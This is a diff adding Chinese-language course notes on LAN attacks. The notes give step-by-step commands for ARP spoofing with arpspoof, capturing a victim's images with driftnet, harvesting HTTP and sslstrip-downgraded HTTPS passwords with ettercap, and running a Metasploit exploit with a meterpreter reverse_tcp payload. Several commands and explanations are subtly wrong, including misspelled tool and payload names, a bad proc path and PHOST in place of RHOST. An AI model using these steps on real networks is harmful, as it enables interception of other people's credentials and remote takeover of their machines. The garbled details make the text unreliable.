@@ -1,0 +1,76 @@
+第五课：局域网攻击
+	arp攻击
+	arpspoof -h  // 查看帮助
+	arpspoof -i 网卡 -t 目标IP 网关
+
+	arpspoof -i eth0 -t 192.168.199.202 192.168.199.1
+
+	扩展：
+		1、网卡获取:ifconfig
+		2、局域网IP获取：fping -asg 192.168.199.0/24
+
+第六课：获取QQ相册
+	配置错误
+	ARP欺骗
+	目标的IP流量经过我的网卡，从网关出去
+	ARP断网
+	目标的流量从我的网卡出去
+
+	进行IP流量转发
+
+	echo 1 >/proc/sys/net/ipv4/ip_forward
+	arpspoof -i eth0 -t 192.168.199.202 192.168.199.1
+
+	drifnet -i eth0
+
+	步骤：1、ARP欺骗 2、获取本机网卡图片
+
+	目标--》我的网卡 --》网关
+		查看自己网卡的信息流
+
+		drifnet -i eth0
+
+		抓取的文件放在自己目录下
+
+第七课：综合应用之Http账号密码获取
+
+	arpspoof   欺骗
+	ettercap  欺骗  DNS欺骗  嗅探
+
+	目标机器：192.168.199.155
+	网关：192.168.199.1
+	源机器：192.168.199.185
+
+	开启IP转发： echo 1 >/proc/sys/net/ipv_4/ip_forward
+	arpspoof -i eth0 -t 192.168.199.155 192.168.199.1
+	ettercap -Tq -i eth0
+	-Tq 启动文件编辑模式，q为安静模式
+
+
+第八课：HTTPS账号密码截取
+	工具	sslstrip	
+
+	第一步：vim /etc/ettercap/etter.conf
+	echo 1 >/proc/sys/net/ipv4/ip_forward
+	sslstrip -a -f -k
+	arpspoof -i eth0 -t 192.168.199.155 192.168.199.1
+	ettercap -Tq -i eth0
+
+
+第九课：Metasploit新手知识不全
+
+	1、启动命令：msfconsole
+		Exploit  漏洞利用
+		payload   shellCode   漏洞利用执行代码
+	show
+
+	use exploit/windows/smb/ms03_049_netapi  //远程漏洞利用代码
+	show options //查看所需参数
+	set PHOST 192.168.1.100
+	set payload windows/meterprreter/reverse_tcp
+	show options
+	exploit
+
+
+
+
